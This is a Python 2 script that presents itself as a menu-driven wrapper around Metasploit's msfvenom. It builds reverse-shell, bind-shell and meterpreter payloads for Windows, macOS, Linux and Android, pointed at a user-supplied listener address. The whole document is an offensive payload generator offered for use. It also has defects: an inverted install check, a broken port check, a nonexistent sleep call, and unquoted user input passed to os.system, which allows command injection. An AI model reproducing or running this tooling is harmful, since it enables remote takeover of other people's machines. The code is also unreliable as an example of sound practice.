import os, sys

#msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python

def banner():
	os.system("clear")
	print "============================"
	print "      Shellcode... Yum"
	print "============================"
	print "Author: A51bot"
	print "OS: "+ sys.platform
	print "Pre-reqs: msfvenom (part of metasploit package)\n\n"

#this module is a pre check and just makes sure we can run the commands we want
def checkForMetasploit():
	if sys.platform == "linux2":
		if os.path.isdir("/opt/metasploit-framework") == True:
			os.system("clear")
			print "AWWWWW CRAP, Dude you gotta install metasloit before I can work :P\n\n"
			print "cd /opt\nsudo git clone https://github.com/rapid7/metasploit-framework.git\nsudo chown -R `whoami` /opt/metasploit-framework\ncd metasploit-framework"
			answer = createAndShowMenu("Continue ?",["YES","NO"])
			if answer == 'NO':
				sys.exit()
	if sys.platform == "darwin":
		if os.path.isdir("/usr/local/share/metasploit-framework/") == False:
			print 'UHHHHH Looks like you dont have metasploit installed \nHere Follow this guide it worked for me\nhttp://www.darkoperator.com/installing-metasploit-framewor/'
			answer = createAndShowMenu("Continue ?",["YES","NO"])
			if answer == 'NO':
				sys.exit()
	if sys.platform == "win32":
		print "dude.... dont even try...\n\n"
		os.sleep(2)
		print 'JK JK. Install metasploit first and if it is installed. Make sure its in your PATH varible'
		sys.exit()

#this is a menu creator that just handles number input
def createAndShowMenu(prompt,items):
	keepgoing = True
	while keepgoing == True:
		try:
			print'[+] '+prompt
			for count ,x in enumerate(items):
				print " "+str(count)+".  "+x
			input = raw_input("Choice: ")
			val = int(input)

			if(val > len(items) or val < 0):
				raise ValueError("Number larger than the list")

			choice = items[val]

			keepgoing = False
			return choice

		except ValueError:
			print("\nBRAH, you have to type a number, ya know 1.2.3\n")
		except IndexError:
			print("\nHEY YO pick somthin thats on the list\n")
			
	
def optionPicker():
	ostype=["Settings","Windows","OSX","Linux","android","list-formats","list-platforms"]
	osprompt="Pick an OS, any OS :D"

	choice = createAndShowMenu(osprompt,ostype)

	if choice == "Settings":
		settings()
	
	if choice == "Windows":
		print "win32 chosen"
		payloadList = ['windows/meterpreter/bind_tcp','windows/meterpreter/reverse_tcp','windows/shell/reverse_tcp','windows/shell/bind_tcp']
		chosenPayload = createAndShowMenu("Pick a payload...",payloadList)
		optionList = setShellcodeOptions(chosenPayload,payloadList,"windows")

	if choice == "OSX":
		print "darwin chosen"
		payloadList = ['osx/x64/shell_reverse_tcp','osx/x64/shell_bind_tcp', 'osx/x64/say']
		chosenPayload = createAndShowMenu("Pick a payload...",payloadList)
		optionList = setShellcodeOptions(chosenPayload,payloadList,"osx")

	if choice == "Linux":
		print "linux chosen"
		payloadList = ['linux/x64/shell/reverse_tcp','linux/x64/shell/bind_tcp','linux/x86/shell/reverse_tcp','linux/x86/shell/bind_tcp']
		chosenPayload = createAndShowMenu("Pick a payload...",payloadList)
		optionList = setShellcodeOptions(chosenPayload,payloadList,"linux")

	if choice == "android":
		payloadList=['android/shell/reverse_tcp','android/meterpreter/reverse_tcp']
		chosenPayload = createAndShowMenu("Pick a payload...",payloadList)
		optionList = setShellcodeOptions(chosenPayload,payloadList,"android")
		
	if choice =="list-formats":
		outputFormats=["asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war"]
		print outputFormats
	if choice =="list-platforms":
		platformList=["javascript", "python", "nodejs", "firefox", "mainframe", "php", "unix", "netware", "irix", "android", "hpux", "java", "aix", "ruby", "freebsd", "netbsd", "linux", "bsdi", "cisco", "openbsd", "osx", "solaris", "bsd", "windows"]
		print platformList


def setShellcodeOptions(chosenPayload, payloadList, platform):
	LHOST="0.0.0.0"
	LPORT="9999"

	if chosenPayload in payloadList:
		badconfig = True
		if "reverse" in chosenPayload or "bind" in chosenPayload:
			#print "Reverse Shell Config"
			while badconfig == True:
				LHOST = raw_input("Enter in the LHOST: ")
				LPORT = raw_input("Enter in the LPORT: ")
				if validate_ip_addr(LHOST) == True:
					badconfig = False
				if validate_port(LPORT) == True:
					badconfig = False				
		if "say" in chosenPayload:
			input=raw_input("What would you like to Say ?: ")
			os.system("/usr/local/bin/msfvenom --platform osx"+" -p "+chosenPayload+" TEXT="+input+" -f macho -o shellcode;")
			sys.exit()

	executeMsfvenom("/usr/local/bin/msfvenom", platform, chosenPayload, LHOST, LPORT,"shellcode")

		

def executeMsfvenom(msfvenomFilePath,platform, payload, LHOST, LPORT, fileName):

	os.system("clear")
	print "============================="
	print "          EXECUTING          "
	print "============================="

	print msfvenomFilePath+" --platform "+platform+" -p "+payload+" LHOST="+LHOST+" LPORT="+LPORT

	if platform == "windows":
		os.system(msfvenomFilePath+" --platform "+platform+" -p "+payload+" LHOST="+LHOST+" LPORT="+LPORT+" -f exe -o "+fileName+".exe")
	if platform == "osx":
		os.system(msfvenomFilePath+" --platform "+platform+" -p "+payload+" LHOST="+LHOST+" LPORT="+LPORT+" -f macho -o "+fileName)
	if platform == "linux":
		os.system(msfvenomFilePath+" --platform "+platform+" -p "+payload+" LHOST="+LHOST+" LPORT="+LPORT+" -f elf -o "+fileName)
	if platform == "android":
		os.system(msfvenomFilePath+" --platform "+platform+" -p "+payload+" LHOST="+LHOST+" LPORT="+LPORT+" -o "+fileName)


def validate_ip_addr(ip):
    ip_s = ip.split('.')
    if len(ip_s) != 4:
        return False
    for x in ip_s:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True

def validate_port(port):
	if port.isdigit() == False:
		return False
	if port < 0 or port > 65535:
		return False

	return True


def spawnListener():
	os.system("clear")
	print "==========================="
	print "  LISTENIN FOR DEM SHELLS  "
	print "==========================="



if __name__ == "__main__":
	try:
		banner()
		checkForMetasploit()
		optionPicker()
	except KeyboardInterrupt:
		os.system("clear")
		print "Remember always get your daily dose of shellcode\n"
	except EOFError:
		os.system("clear")
		print "\nYou cant quit me..."